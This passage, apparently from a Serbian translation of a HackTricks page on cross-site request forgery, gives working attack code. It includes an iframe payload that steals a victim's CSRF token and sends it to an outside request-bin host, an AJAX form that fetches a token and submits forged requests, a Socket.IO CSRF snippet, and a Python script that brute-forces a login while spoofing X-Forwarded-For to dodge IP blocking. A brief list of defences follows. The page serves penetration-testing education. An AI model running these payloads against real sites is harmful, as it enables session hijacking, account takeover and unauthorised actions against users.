Kada žrtva poseti veb stranicu koja sadrži ove iframe-e, njen CSRF token će biti ukraden i poslat na drugu veb stranicu. Ovo omogućava napadaču da izvrši neovlaštene radnje u ime žrtve.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTUkradi CSRF token pomoću Ajax-a i pošalji post zahtev sa formom**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF sa Socket.IO

CSRF (Cross-Site Request Forgery) napad je vrsta napada koji se koristi za izvršavanje neovlašćenih radnji u ime korisnika na veb aplikacijama. Kada se koristi Socket.IO, koji je biblioteka za realno vreme, moguće je izvršiti CSRF napad na veb aplikaciju koja koristi ovu biblioteku.

Da biste izvršili CSRF napad sa Socket.IO, potrebno je da napadač ubaci zlonamerni kod u legitimnu veb stranicu koju korisnik posećuje. Ovaj zlonamerni kod će zatim iskoristiti Socket.IO biblioteku da bi poslao zahtev na ciljanu veb aplikaciju, izvršavajući tako neovlaštene radnje u ime korisnika.

Da biste se zaštitili od CSRF napada sa Socket.IO, možete primeniti sledeće mere:

1. Implementirajte CSRF zaštitu na serveru: Ovo uključuje generisanje i proveru CSRF tokena za svaki zahtev koji dolazi sa Socket.IO konekcijom. Na taj način se osigurava da samo legitimni zahtevi budu prihvaćeni.

2. Koristite SameSite atribut za kolačiće: Postavljanje SameSite atributa na "Strict" ili "Lax" za kolačiće koji se koriste sa Socket.IO može sprečiti CSRF napade. Ovaj atribut ograničava slanje kolačića samo na isti sajt ili na sajtove koji su deo istog domena.

3. Upotrebite CSRF zaštitu na klijentskoj strani: Implementirajte CSRF token na klijentskoj strani i proverite ga pre slanja zahteva putem Socket.IO. Ovo će dodatno otežati napadačima da izvrše CSRF napad.

Primenom ovih mera, možete smanjiti rizik od CSRF napada sa Socket.IO i osigurati bezbednost vaše veb aplikacije.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force napad na prijavljivanje

Kod se može koristiti za Brute Force napad na formu za prijavljivanje koristeći CSRF token (Takođe koristi zaglavlje X-Forwarded-For kako bi pokušao zaobići moguće blokiranje IP adrese):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Alati <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Reference

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
